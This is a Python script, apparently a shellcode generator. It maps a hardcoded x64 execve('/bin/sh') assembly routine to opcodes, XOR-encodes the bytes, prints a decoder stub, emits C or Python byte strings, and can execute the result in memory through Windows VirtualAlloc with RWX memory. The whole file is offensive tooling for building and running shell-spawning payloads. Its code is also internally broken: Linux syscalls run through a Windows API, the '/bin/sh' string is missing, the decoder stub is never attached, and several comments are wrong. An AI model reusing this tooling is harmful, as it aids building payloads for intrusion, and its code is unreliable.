#!/usr/bin/env python3
import re
import argparse
from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32

# Hardcoded assembly with comments (no addresses/opcodes)
ASSEMBLY_CODE = """
    xor    rax,rax          ; RAX = 0 (syscall number for read)
    xor    rdi,rdi          ; RDI = 0 (stdin)
    xor    rsi,rsi          ; RSI = 0 (buffer address)
    xor    rdx,rdx          ; RDX = 0 (bytes to read)
    jmp    end              ; Jump to avoid null bytes
    loop:
    pop    rsi              ; RSI = address of "/bin/sh"
    mov    rdi,rsi          ; RDI = RSI (argv[0])
    add    rdi,0x7          ; RDI += 7 (skip to null terminator)
    mov    rdx,rdi          ; RDX = RDI (envp)
    add    rdx,0xf          ; RDX += 15 (skip to end of string)
    mov    rcx,rsi          ; RCX = RSI (backup)
    sub    rcx,rdi          ; RCX -= RDI (calculate length)
    mov    al,0x3b          ; RAX = 59 (execve syscall)
    syscall                 ; Invoke execve("/bin/sh", NULL, NULL)
    xor    rax,rax          ; RAX = 0 (exit syscall)
    xor    rdi,rdi          ; RDI = 0 (exit status)
    end:
    call   loop             ; Recursive call (infinite loop)
"""

# Predefined opcode mappings (simplified for common x64 instructions)
OPCODE_MAP = {
    "xor rax,rax": b"\x48\x31\xc0",
    "xor rdi,rdi": b"\x48\x31\xff",
    "xor rsi,rsi": b"\x48\x31\xf6",
    "xor rdx,rdx": b"\x48\x31\xd2",
    "jmp end":     b"\xeb\x1f",
    "pop rsi":     b"\x5e",
    "mov rdi,rsi": b"\x48\x89\xf7",
    "add rdi,0x7": b"\x48\x83\xc7\x07",
    "mov rdx,rdi": b"\x48\x89\xfa",
    "add rdx,0xf": b"\x48\x83\xc2\x0f",
    "mov rcx,rsi": b"\x48\x89\xf1",
    "sub rcx,rdi": b"\x48\x29\xf9",
    "mov al,0x3b": b"\xb0\x3b",
    "syscall":     b"\x0f\x05",
    "call loop":   b"\xe8\xdc\xff\xff\xff",
}

# Configuration
XOR_KEY = 0xAA  # Default XOR key
OUTPUT_FILE = "shellcode.bin"

def xor_encode(shellcode, key=XOR_KEY):
    """XOR-encode shellcode to avoid null bytes."""
    return bytes([b ^ key for b in shellcode])

def generate_xor_decoder_stub(encoded_shellcode, key=XOR_KEY):
    """Generates a decoder stub to XOR-decode the shellcode at runtime."""
    decoder_stub = f"""
    ; XOR decoder stub (key: 0x{key:02x})
    xor    rcx, rcx             ; RCX = 0 (counter)
    mov    rdx, {len(encoded_shellcode)}  ; RDX = shellcode length
    lea    rsi, [rel $+7]       ; RSI = address of encoded shellcode
    decode_loop:
    xor    byte [rsi + rcx], {hex(key)}  ; Decode byte
    inc    rcx                  ; Increment counter
    cmp    rcx, rdx             ; Check if done
    jne    decode_loop          ; Loop if not
    jmp    rsi                  ; Jump to decoded shellcode
    """
    return decoder_stub

def parse_assembly():
    """Converts assembly instructions to shellcode using OPCODE_MAP."""
    shellcode = bytearray()
    lines = [line.strip() for line in ASSEMBLY_CODE.split('\n') if line.strip()]
    
    for line in lines:
        # Extract instruction (ignore comments)
        instruction = line.split(';')[0].strip()
        if instruction in OPCODE_MAP:
            shellcode.extend(OPCODE_MAP[instruction])
        else:
            print(f"[!] Unknown instruction: {instruction}")
    return bytes(shellcode)

def format_shellcode(shellcode, format_type="c", bytes_per_line=16):
    """Formats shellcode for C or Python."""
    formatted = []
    for i in range(0, len(shellcode), bytes_per_line):
        chunk = shellcode[i:i+bytes_per_line]
        hex_str = "".join([f"\\x{b:02x}" for b in chunk])
        if format_type == "c":
            formatted.append(f'"{hex_str}"')
        else:
            formatted.append(f'buf += b"{hex_str}"')
    return "\n".join(formatted)

def write_shellcode_to_file(shellcode, filename):
    """Writes raw shellcode to a file."""
    try:
        with open(filename, "wb") as f:
            f.write(shellcode)
        print(f"[+] Raw shellcode saved to: {filename}")
    except Exception as e:
        print(f"[!] Failed to write file: {e}")

def test_shellcode(shellcode):
    """Executes shellcode in memory (for testing)."""
    try:
        ptr = windll.kernel32.VirtualAlloc(None, len(shellcode), 0x1000, 0x40)
        if not ptr:
            print("[!] Failed to allocate memory")
            return False
        windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
        windll.kernel32.FlushInstructionCache(windll.kernel32.GetCurrentProcess(), ptr, len(shellcode))
        func_type = CFUNCTYPE(None)
        func = cast(ptr, func_type)
        print("[+] Executing shellcode...")
        func()
        windll.kernel32.VirtualFree(ptr, 0, 0x8000)
        return True
    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Convert assembly to XOR-encoded shellcode with decoder stub.")
    parser.add_argument("--output", help="Output .bin file (default: shellcode.bin)", default=OUTPUT_FILE)
    parser.add_argument("--format", help="Output format: c (default) or python", default="c")
    parser.add_argument("--no-xor", help="Disable XOR encoding", action="store_true")
    parser.add_argument("--test", help="Test shellcode execution", action="store_true")
    args = parser.parse_args()

    # Generate raw shellcode
    shellcode = parse_assembly()
    if not shellcode:
        print("[!] No shellcode generated. Check ASSEMBLY_CODE and OPCODE_MAP.")
        return

    # XOR-encode by default (unless --no-xor is specified)
    if not args.no_xor:
        encoded_shellcode = xor_encode(shellcode)
        decoder_stub = generate_xor_decoder_stub(encoded_shellcode)
        print("[+] XOR-encoded shellcode (key: 0x{:02x}) with decoder stub:".format(XOR_KEY))
        print(decoder_stub)
        shellcode = encoded_shellcode

    print(f"[+] Shellcode size: {len(shellcode)} bytes")

    write_shellcode_to_file(shellcode, args.output)
    print(f"\n// --- {args.format.upper()} Shellcode ---")
    print(format_shellcode(shellcode, args.format))

    if args.test:
        print("\n[+] Testing shellcode...")
        test_shellcode(shellcode)

if __name__ == "__main__":
    main()
